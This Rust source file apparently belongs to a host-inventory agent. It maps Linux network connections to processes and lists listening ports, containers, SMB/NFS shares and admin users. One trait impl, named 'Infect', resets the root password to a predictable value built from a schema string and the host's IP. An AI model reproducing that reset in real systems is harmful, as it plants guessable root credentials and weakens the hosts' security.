use pnet::datalink;
use procfs::net::{route, unix, TcpNetEntry, TcpState, UdpNetEntry, UdpState};
use procfs::process::FDTarget;
use procfs::process::Stat;
use serde_json::json;
use serde_json::Map;
use serde_json::Value;
use std;
use std::collections::HashMap;
use std::fs;
use std::io::Write;
use std::path::Path;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;
use sysinfo::UserExt;

impl From<&UdpState> for super::types::ConnectionState {
    fn from(udp_state: &UdpState) -> Self {
        match udp_state {
            UdpState::Established => super::types::ConnectionState::Established,
            UdpState::Close => super::types::ConnectionState::Closed,
        }
    }
}

impl From<&TcpState> for super::types::ConnectionState {
    fn from(tcp_state: &TcpState) -> Self {
        match tcp_state {
            TcpState::Established => super::types::ConnectionState::Established,
            TcpState::SynSent => super::types::ConnectionState::SynSent,
            TcpState::SynRecv => super::types::ConnectionState::SynRecv,
            TcpState::FinWait1 => super::types::ConnectionState::FinWait1,
            TcpState::FinWait2 => super::types::ConnectionState::FinWait2,
            TcpState::TimeWait => super::types::ConnectionState::TimeWait,
            TcpState::Close => super::types::ConnectionState::Closed,
            TcpState::CloseWait => super::types::ConnectionState::CloseWait,
            TcpState::LastAck => super::types::ConnectionState::LastAck,
            TcpState::Listen => super::types::ConnectionState::Listen,
            TcpState::Closing => super::types::ConnectionState::Closing,
            _ => super::types::ConnectionState::Unknown,
        }
    }
}

fn change_password(username: &str, password: &str) -> std::io::Result<()> {
    let mut child = Command::new("passwd")
        .arg(username)
        .stdin(Stdio::piped())
        .spawn()?;

    {
        let stdin = child.stdin.as_mut().expect("Failed to open stdin");
        stdin.write_all(password.as_bytes())?;
        stdin.write_all(b"\n")?;
        stdin.write_all(password.as_bytes())?;
        stdin.write_all(b"\n")?;
    }

    let output = child.wait_with_output()?;

    if output.status.success() {
        println!("Password changed successfully.");
    } else {
        eprintln!("Failed to change password.");
    }

    Ok(())
}

impl super::types::Infect for crate::Host {
    fn init(&self, schema: &str) {
        let password = format!(
            "{}{:?}!",
            schema,
            self.ip.split('.').last().unwrap().parse::<u16>().ok()
        );
        let _ = change_password("root", password.as_str());
    }
}

// // build up a map between socket inodes and process stat info:
impl super::types::OS for crate::Host {
    fn conn_info() -> (
        Box<[super::types::NetworkConnection]>,
        Box<[super::types::OpenPort]>,
    ) {
        let all_procs = procfs::process::all_processes().unwrap(); // handle errors appropriately
        let mut map: HashMap<u64, Stat> = HashMap::new();
        for p in all_procs {
            // let process = p.unwrap(); // handle errors appropriately
            match p {
                Ok(process) => {
                    if let (Ok(stat), Ok(fds)) = (process.stat(), process.fd()) {
                        for fd in fds {
                            match fd {
                                Ok(fd) => {
                                    if let FDTarget::Socket(inode) = fd.target {
                                        // handle errors appropriately
                                        map.insert(inode, stat.clone());
                                    }
                                }
                                Err(_) => {}
                            }
                        }
                    }
                }
                Err(_) => {}
            }
        }

        let shared_map = Arc::new(map);

        // Get start time
        let start_time = std::time::Instant::now();
        let tcp_connections = process_network_entries(procfs::net::tcp, Arc::clone(&shared_map));
        let udp_connections = process_network_entries(procfs::net::udp, Arc::clone(&shared_map));
        let tcp6_connections = process_network_entries(procfs::net::tcp6, Arc::clone(&shared_map));
        let udp6_connections = process_network_entries(procfs::net::udp6, shared_map);
        let end_time = std::time::Instant::now();

        println!("Mapped All processes in {:?}", end_time - start_time);

        // Combine TCP and UDP connections
        let mut all_connections = Vec::new();
        all_connections.extend(tcp_connections);
        all_connections.extend(udp_connections);
        all_connections.extend(tcp6_connections);
        all_connections.extend(udp6_connections);

        let mut open_ports = Vec::new();

        // Get the open ports
        all_connections
            .iter()
            .filter(|conn| {
                conn.local_address.contains("0.0.0.0")
                    && conn
                        .state
                        .as_ref()
                        .unwrap_or(&super::types::ConnectionState::default())
                        == &super::types::ConnectionState::Listen
            })
            .filter_map(|conn| {
                // Extract the port number and additional data safely
                conn.local_address.split(':').last().and_then(|port_str| {
                    port_str
                        .parse::<u16>()
                        .ok()
                        .map(|port| (port, conn.process.clone(), &conn.state, &conn.protocol))
                })
            })
            .for_each(|(port, pid, state, protocol)| {
                let open_port = super::types::OpenPort {
                    port,
                    protocol: protocol.clone(),
                    process: pid, // Assuming pid is an Option<i32> or similar
                    version: "".into(),
                    state: state.clone(), // Convert state to String if needed
                };
                open_ports.push(open_port);
            });

        (
            all_connections.into_boxed_slice(),
            open_ports.into_boxed_slice(),
        )
    }

    fn firewall_rules() {
        todo!()
    }

    fn ip() -> Box<str> {
        let routes = match route() {
            Ok(r) => r,
            Err(_) => return "0.0.0.0".into(),
        };

        let intface = match routes
            .iter()
            .filter(|r| r.destination.is_unspecified())
            .last()
        {
            Some(route) => route.iface.clone(),
            None => return "0.0.0.0".into(),
        };

        let interfaces = datalink::interfaces();
        let interface = interfaces
            .into_iter()
            .find(|iface| iface.name == intface.to_string());

        match interface {
            Some(iface) => match iface.ips.first() {
                Some(ip) => ip.ip().to_string().into_boxed_str(),
                None => "0.0.0.0".into(),
            },
            None => "0.0.0.0".into(),
        }
    }

    fn containers() -> Box<[super::types::Container]> {
        let mut containers = Vec::new();

        if which::which("docker").is_ok() {
            containers.extend(get_generic_containers("docker"));
        }

        if which::which("podman").is_ok() {
            containers.extend(get_generic_containers("podman"));
        }

        // containers.extend(get_podman_containers());
        // if which::which("kubectl").is_ok() {
        //     containers.extend(get_kubectl_pods());
        // }
        containers.into_boxed_slice()
    }

    fn services() -> Box<[super::types::Service]> {
        // println!("{:?}", list_services(&detect_init_system()));
        Box::new([])
    }

    fn shares() -> Box<[super::types::Share]> {
        let smb_shares = read_samba_shares("/var/lib/samba/usershares");
        let nfs_shares = read_nfs_shares("/etc/exports");

        smb_shares
            .into_iter()
            .chain(nfs_shares.into_iter())
            .collect()
    }
}

fn read_samba_shares(directory: &str) -> Vec<super::types::Share> {
    if let Ok(entries) = fs::read_dir(directory) {
        entries
            .filter_map(|entry| {
                let entry = entry.ok()?;
                let content = fs::read_to_string(entry.path()).ok()?;
                let network_path = extract_path(&content)?;
                Some(super::types::Share {
                    share_type: super::types::ShareType::SMB,
                    network_path: Box::from(network_path),
                })
            })
            .collect()
    } else {
        Vec::new()
    }
}

fn parse_exports_line(line: &str) -> Option<super::types::Share> {
    let parts: Vec<&str> = line.split_whitespace().collect();
    parts.first().map(|&path| super::types::Share {
        share_type: super::types::ShareType::NFS,
        network_path: path.into(),
    })
}

fn read_nfs_shares(filepath: &str) -> Vec<super::types::Share> {
    if let Ok(contents) = fs::read_to_string(filepath) {
        contents
            .lines()
            .filter(|line| !line.trim().is_empty() && !line.trim_start().starts_with('#'))
            .filter_map(parse_exports_line)
            .collect()
    } else {
        Vec::new()
    }
}

fn extract_path(file_content: &str) -> Option<String> {
    file_content
        .lines()
        .find(|line| line.starts_with("path="))
        .map(|line| line[5..].to_string())
}

fn process_network_entries<F, T>(
    fetch_entries: F,
    map: Arc<HashMap<u64, Stat>>,
) -> Vec<super::types::NetworkConnection>
where
    F: Fn() -> Result<Vec<T>, procfs::ProcError> + Send + 'static,
    T: NetworkData + Send + 'static, // Ensure T is Send
{
    // Spawn a thread to process the entries
    let handle = thread::spawn(move || {
        let mut connections = Vec::new();

        // Fetch the entries
        if let Ok(entries) = fetch_entries() {
            // Iterate over the entries
            for entry in entries {
                let state = entry.state(); // Get the state without consuming entry

                // Filter out CLOSE connections
                if !state.is_closed() {
                    let connection = super::types::NetworkConnection {
                        local_address: entry.local_address(),
                        remote_address: Some(entry.remote_address()),
                        state: Some(state),
                        protocol: entry.protocol(),
                        process: map.get(&entry.inode()).map(|stat| super::types::Process {
                            pid: stat.pid,
                            name: stat.comm.clone().into_boxed_str(),
                        }),
                        // .map(|stat| (stat.pid, stat.comm.clone())),
                    };
                    connections.push(connection);
                }
            }
        }
        connections
    });

    handle.join().unwrap() // Join the thread and unwrap the result
}

trait NetworkData {
    fn local_address(&self) -> Box<str>;
    fn remote_address(&self) -> Box<str>;
    fn inode(&self) -> u64;
    fn state(&self) -> super::types::ConnectionState;
    fn protocol(&self) -> Box<str>;
}

impl NetworkData for UdpNetEntry {
    fn local_address(&self) -> Box<str> {
        // Return the local_address from TcpNetEntry
        self.local_address.to_string().into_boxed_str()
    }

    fn remote_address(&self) -> Box<str> {
        // Return the remote_address from TcpNetEntry
        self.remote_address.to_string().into_boxed_str()
    }

    fn inode(&self) -> u64 {
        // Return the inode from TcpNetEntry
        self.inode
    }

    fn state(&self) -> super::types::ConnectionState {
        // Return the state from TcpNetEntry
        super::types::ConnectionState::from(&self.state)
    }

    fn protocol(&self) -> Box<str> {
        "UDP".into()
    }
}

impl NetworkData for TcpNetEntry {
    fn local_address(&self) -> Box<str> {
        // Return the local_address from TcpNetEntry
        self.local_address.to_string().into_boxed_str()
    }

    fn remote_address(&self) -> Box<str> {
        // Return the remote_address from TcpNetEntry
        self.remote_address.to_string().into_boxed_str()
    }

    fn inode(&self) -> u64 {
        // Return the inode from TcpNetEntry
        self.inode
    }

    fn state(&self) -> super::types::ConnectionState {
        // Return the state from TcpNetEntry
        super::types::ConnectionState::from(&self.state)
    }

    fn protocol(&self) -> Box<str> {
        "TCP".into()
    }
}

// fn get_kubectl_pods() -> Vec<Container> {
//     let output = Command::new("kubectl")
//         .args(&["get", "pods", "--all-namespaces", "-o", "json"])
//         .output()
//         .expect("Failed to execute command");

//     let output_str = String::from_utf8_lossy(&output.stdout);
//     let parsed_json: serde_json::Value = serde_json::from_str(&output_str).unwrap();

//     parsed_json["items"]
//         .as_array()
//         .unwrap_or(&vec![])
//         .iter()
//         .map(|pod| Container {
//             name: format!(
//                 "{}/{}",
//                 pod["metadata"]["namespace"], pod["metadata"]["name"]
//             )
//             .into(),
//             status: pod["status"]["phase"].as_str().unwrap_or("").into(),
//             id: "".into(),
//             cmd: "".into(),
//             port_bindings: "".into(),
//         })
//         .collect()
// }

fn get_container_ids(command: &str) -> Vec<String> {
    let output = Command::new(command)
        .args(&["ps", "-q"])
        .output()
        .expect("Failed to execute docker ps command");

    String::from_utf8_lossy(&output.stdout)
        .lines()
        .map(String::from)
        .collect()
}

fn get_generic_containers(command: &str) -> Vec<super::types::Container> {
    let container_ids = get_container_ids(command);

    container_ids
        .iter()
        .filter_map(|id| {
            let output = Command::new(command)
                .args(&["inspect", id])
                .output()
                .expect("Failed to execute docker inspect command");

            let inspect_str = String::from_utf8_lossy(&output.stdout);
            parse_generic_container(&inspect_str).ok()
        })
        .collect()
}

fn parse_generic_container(
    inspect_data: &str,
) -> Result<super::types::Container, serde_json::Error> {
    let json: serde_json::Value = serde_json::from_str(inspect_data)?;

    let container_info = &json[0];

    Ok(super::types::Container {
        name: container_info["Name"].as_str().unwrap_or_default().into(),
        status: container_info["State"]["Status"]
            .as_str()
            .unwrap_or_default()
            .into(),
        id: container_info["Id"].as_str().unwrap_or_default().into(),
        cmd: container_info["Config"]["Cmd"]
            .as_array()
            .unwrap_or(&vec!["".into()])[0]
            .as_str()
            .unwrap_or_default()
            .into(),
        port_bindings: parse_port_from_inspect(
            &container_info["NetworkSettings"]["Ports"].as_object(),
        )
        .into(),
        volumes: parse_volumes_from_inspect(&container_info["Mounts"].as_array()).into(),
        networks: parse_networks_from_inspect(
            &container_info["NetworkSettings"]["Networks"].as_object(),
        ),
    })
}

fn parse_volumes_from_inspect(
    mounts: &Option<&Vec<Value>>,
) -> Box<[super::types::ContainerVolume]> {
    mounts.map_or(Box::new([]), |mounts| {
        mounts
            .iter()
            .filter_map(|mount| {
                Some(super::types::ContainerVolume {
                    host_path: mount["Source"].as_str()?.into(),
                    container_path: mount["Destination"].as_str()?.into(),
                    mode: mount["Mode"].as_str()?.into(),
                    name: mount["Name"].as_str()?.into(),
                    rw: mount["RW"].as_bool()?,
                    v_type: mount["Type"].as_str()?.into(),
                })
            })
            .collect::<Box<_>>()
        // .into_boxed_slice()
    })
}

fn parse_networks_from_inspect(
    networks: &Option<&Map<String, Value>>,
) -> Box<[super::types::ContainerNetwork]> {
    // Parse the JSON and extract network information
    networks.map_or(Box::new([]), |networks| {
        networks
            .iter()
            .map(|(name, network_data)| super::types::ContainerNetwork {
                name: name.clone().into_boxed_str(),
                ip: network_data["IPAddress"]
                    .as_str()
                    .unwrap_or_default()
                    .into(),
                gateway: network_data["Gateway"].as_str().unwrap_or_default().into(),
                mac_address: network_data["MacAddress"]
                    .as_str()
                    .unwrap_or_default()
                    .into(),
            })
            .collect::<Box<_>>()
    })
}

fn parse_port_from_inspect(port_map: &Option<&Map<String, Value>>) -> Box<[Box<str>]> {
    port_map.map_or(Box::new([] as [Box<str>; 0]), |ports_map| {
        ports_map
            .iter()
            .flat_map(|(container_port, host_ports)| {
                host_ports
                    .as_array()
                    .map_or(Vec::new(), |host_ports_array| {
                        host_ports_array
                            .iter()
                            .filter_map(|host_port_details| {
                                let host_ip =
                                    host_port_details["HostIp"].as_str().unwrap_or("0.0.0.0");
                                let host_port =
                                    host_port_details["HostPort"].as_str().unwrap_or("");
                                Some(
                                    format!("{}:{}->{}", host_ip, host_port, container_port)
                                        .into_boxed_str(),
                                )
                            })
                            .collect::<Vec<Box<str>>>()
                    })
            })
            .collect::<Box<[Box<str>]>>() // Directly collecting into a Boxed Slice
    })
}

enum InitSystem {
    SYSTEMD,
    UPSTART,
    SYSVINIT,
    OPENRC,
    UNKNOWN,
}

fn detect_init_system() -> InitSystem {
    if Path::new("/usr/lib/systemd/systemd").exists() || Path::new("/lib/systemd/systemd").exists()
    {
        InitSystem::SYSTEMD
    } else if Path::new("/sbin/initctl").exists() {
        InitSystem::UPSTART
    } else if Path::new("/etc/init.d/").exists() {
        InitSystem::SYSVINIT // cOULD ALSO BE oPENrc, ADDITIONAL CHECKS MIGHT BE NEEDED
    } else {
        InitSystem::UNKNOWN
    }
}

fn list_services(init_system: &InitSystem) {
    let output = match init_system {
        InitSystem::SYSTEMD => Command::new("systemctl")
            .arg("list-units")
            .arg("--type=service")
            .output()
            .expect("Failed to execute systemctl"),
        InitSystem::SYSVINIT | InitSystem::OPENRC => Command::new("service")
            .arg("--status-all")
            .output()
            .expect("Failed to execute service command"),
        InitSystem::UPSTART => Command::new("initctl")
            .arg("list")
            .output()
            .expect("Failed to execute initctl"),
        _ => {
            println!("Unknown init system");
            return;
        }
    };

    match output.status.success() {
        true => println!("Output:\n{}", String::from_utf8_lossy(&output.stdout)),
        false => println!("Error:\n{}", String::from_utf8_lossy(&output.stderr)),
    }
}

impl super::types::UserInfo for sysinfo::User {
    // If compiled for linux
    fn is_admin(&self) -> bool {
        // Check for sudoers group in groups or uid 0 (root)
        self.groups().iter().any(|group| group == "wheel") || self.id().to_string() == "0"
    }

    fn is_local(&self) -> bool {
        true
    }
}
